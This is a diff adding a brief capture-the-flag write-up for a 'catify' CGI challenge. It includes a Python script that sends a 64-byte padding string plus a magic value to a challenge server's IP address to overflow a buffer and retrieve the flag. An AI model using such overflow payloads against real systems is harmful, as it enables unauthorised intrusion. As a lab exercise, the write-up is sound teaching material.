@@ -1,0 +1,9 @@
+Get binary by visiting 172.105.214.27:10508/catify.cgi
+The rest is simple buffer overflow to change variable value
+Script to perform query and get flag is shown below
+
+	
+	import requests
+	url = 'http://172.105.214.27:10508/cgi-bin/catify.cgi'
+	r = requests.get(url=url,params={'name':'a'*0x40+'H0WT0M0D1FYTH3K3Y'})
+	print(r.text)
